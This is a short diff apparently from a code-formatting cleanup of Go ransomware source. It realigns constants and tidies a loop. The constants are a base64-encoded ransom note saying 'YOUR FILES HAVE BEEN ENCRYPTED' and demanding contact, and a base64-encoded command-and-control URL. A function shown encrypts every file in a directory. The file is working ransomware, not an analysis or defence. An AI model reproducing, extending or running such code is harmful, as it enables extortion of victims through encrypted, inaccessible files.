@@ -18,8 +18,8 @@ import (
 
 const (
 	README string = "Desktop/README.txt"
-	NOTE string = "WU9VUiBGSUxFUyBIQVZFIEJFRU4gRU5DUllQVEVEICEhIQpEb24ndCBtYWtlIGFueSBzdHVwaWQgbW92ZSB0byBkZWNyeXB0IHRoZW0gb3IgZWxzZSB5b3Ugd2lsbCBoYXZlIHBlcm1hbmVudGx5IGxvc3QgYWNjZXNzIHRvIHRoZW0gISAKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjClRPIFJFQ09WRVIgVEhFTSA6CkNvbnRhY3QgdXMgaGVyZSBhbmQgcHJvdmlkZSB0aGlzIGFzIHlvdXIgaWQgOgo="
-	C2 string = "aHR0cDovLzEyNy4wLjAuMTo4MDgwLwo="
+	NOTE   string = "WU9VUiBGSUxFUyBIQVZFIEJFRU4gRU5DUllQVEVEICEhIQpEb24ndCBtYWtlIGFueSBzdHVwaWQgbW92ZSB0byBkZWNyeXB0IHRoZW0gb3IgZWxzZSB5b3Ugd2lsbCBoYXZlIHBlcm1hbmVudGx5IGxvc3QgYWNjZXNzIHRvIHRoZW0gISAKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjClRPIFJFQ09WRVIgVEhFTSA6CkNvbnRhY3QgdXMgaGVyZSBhbmQgcHJvdmlkZSB0aGlzIGFzIHlvdXIgaWQgOgo="
+	C2     string = "aHR0cDovLzEyNy4wLjAuMTo4MDgwLwo="
 )
 
 func main() {
@@ -120,7 +120,7 @@ func list_files(path string) []string {
 
 // encrypt all the files in dir
 func encrypt_dir(dir string, key []byte) {
-	for _, file := range(list_files(dir)) {
+	for _, file := range list_files(dir) {
 		encrypt_file(file, key)
 	}
 }
